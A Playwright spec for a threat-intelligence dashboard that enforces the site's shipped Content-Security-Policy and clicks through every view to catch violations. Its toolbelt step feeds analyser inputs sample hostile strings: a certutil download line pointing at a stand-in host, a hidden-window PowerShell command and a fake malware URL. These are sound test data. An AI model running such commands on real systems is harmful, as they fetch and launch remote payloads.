// csp.spec.js — the policy in site/_headers is the one that ships. This spec
// replays it as a <meta http-equiv> so the browser enforces it locally, then
// exercises every interactive surface. A single securitypolicyviolation means
// the site works in dev and breaks the moment it is deployed behind _headers.
const { test, expect } = require("@playwright/test");
const fs = require("fs");
const path = require("path");
const R = require("../lib/real");

const CSP = R.cspFromHeaders();
const INDEX = fs.readFileSync(path.join(R.SITE, "index.html"), "utf8");

// The global config sets bypassCSP so app specs can use Playwright's own
// instrumentation (which needs eval). THIS spec must not bypass — otherwise it
// asserts nothing. Re-enable enforcement for the whole describe block.
test.use({ bypassCSP: false });

test.describe("published Content-Security-Policy", () => {
  test("the policy allows neither unsafe-inline nor unsafe-eval", () => {
    expect(CSP).not.toMatch(/unsafe-inline/i);
    expect(CSP).not.toMatch(/unsafe-eval/i);
    expect(CSP).not.toMatch(/unsafe-hashes/i);
    // the meaningful lockdown directives must actually be present
    for (const d of ["default-src 'none'", "object-src 'none'", "base-uri 'none'",
                     "frame-ancestors 'none'", "form-action 'none'"])
      expect(CSP, `policy must contain: ${d}`).toContain(d);
  });

  test("no violation fires across a full pass over every section", async ({ page }) => {
    await page.addInitScript(() => {
      window.__csp = [];
      document.addEventListener("securitypolicyviolation", e => window.__csp.push(
        `${e.effectiveDirective || e.violatedDirective} <- ${e.blockedURI || "inline"}` +
        `${e.sourceFile ? ` @ ${e.sourceFile}:${e.lineNumber}` : ""}`), true);
    });
    // serve index.html with the shipped policy enforced in-document
    await page.route("**/index.html", route => route.fulfill({
      status: 200, contentType: "text/html; charset=utf-8",
      body: `<meta http-equiv="Content-Security-Policy" content="${CSP}">\n${INDEX}`,
    }));

    const errors = R.watchConsole(page, [
      // meta delivery legitimately ignores these; they are header-only directives
      /is ignored when delivered via a <meta> element/i,
      /frame-ancestors/i,
    ]);

    await page.goto("/index.html");
    // NOT waitForFunction: it evaluates a string, which this very policy
    // blocks (no 'unsafe-eval'). Locator polling needs no eval.
    await expect(page.locator("#feedRows .row").first()).toBeVisible({ timeout: 15000 });

    // --- omnibox lookup (verdict console, gauge, docket, pivots) --------------
    await page.fill("#q", R.topKevCve().cve);
    await page.press("#q", "Enter");
    await expect(page.locator("#vword")).toHaveText("ACTIVELY EXPLOITED", { timeout: 8000 });
    await page.click("#console [data-esc=md]").catch(() => {});
    await page.keyboard.press("Escape");                 // back to browse mode

    // --- feed view: sort toggle, filter chip, search, load-more, rail --------
    const chip = page.locator("#filters .fchip").nth(1);
    await chip.click();
    await page.fill("#q2", "a");
    await page.waitForTimeout(300);
    await page.fill("#q2", "");
    await page.waitForTimeout(300);
    await page.locator("#filters .fchip[data-f=all]").click();
    await page.click("#sortNewest");
    await page.click("#sortPriority");
    if (await page.locator("#feedMore").isVisible()) await page.click("#feedMore");
    await page.locator("#feedRows .row").first().click();
    await page.locator("#feedRows .row").first().locator("[data-act=review]").click();

    // --- vulnerabilities view: sorts, KEV filter, watchlist, show more -------
    await page.click("nav [data-view=vulns]");
    for (const th of await page.locator("#cveHead th[data-sort]").all()) {
      await th.click();
      await page.waitForTimeout(60);
    }
    await page.click("#kevOnly");
    await page.waitForTimeout(120);
    await page.click("#kevOnly");
    await page.fill("#wlInput", R.busiestVendor()[0]);
    await page.press("#wlInput", "Enter");
    await page.click("#wlOnly");
    await page.waitForTimeout(120);
    await page.click("#wlOnly");
    if (await page.locator("#showMore").isVisible()) await page.click("#showMore");
    await page.locator("#cveRows tr").first().click();
    await page.keyboard.press("Escape");

    // --- actors, health, sources views ---------------------------------------
    await page.click("nav [data-view=actors]");
    if (await page.locator("#actorFilter").isVisible()) {
      await page.fill("#actorFilter", "a");
      await page.waitForTimeout(300);
      await page.fill("#actorFilter", "");
      await page.waitForTimeout(300);
      const card = page.locator("#actorGrid .acard").first();
      if (await card.count()) { await card.click(); await page.keyboard.press("Escape"); }
    }
    await page.click("nav [data-view=health]");
    await page.click("nav [data-view=sources]");

    // --- all five toolbelt cards ---------------------------------------------
    await page.click("nav [data-view=toolbelt]");
    await page.fill("#defangIn", "http://evil-updates.example.com/p.exe 10.14.88.2");
    await page.click("#defangBtn");
    await page.fill("#extractIn", "hits 8.8.8.8 and http://bad.example.com/a CVE-2024-3400");
    await page.click("#extractBtn");
    await page.click("#extractLookup");
    await page.fill("#b64In", "SGVsbG8gVklHSUw=");
    await page.click("#b64Btn");
    await page.fill("#psIn", "powershell.exe -nop -w hidden -c Get-Process");
    await page.click("#psBtn");
    await page.fill("#lolbinIn", "certutil.exe -urlcache -split -f http://x/a");
    await page.click("#lolbinBtn");

    // --- keyboard triage path -------------------------------------------------
    await page.click("nav [data-view=feed]");
    await page.evaluate(() => document.activeElement?.blur());   // leave any input
    for (const k of ["j", "j", "k", "r", "n"]) await page.keyboard.press(k);

    await page.waitForTimeout(800);

    const violations = await page.evaluate(() => window.__csp);
    expect(violations, "the shipped CSP must not block anything the page does").toEqual([]);
    expect(errors()).toEqual([]);
  });
});
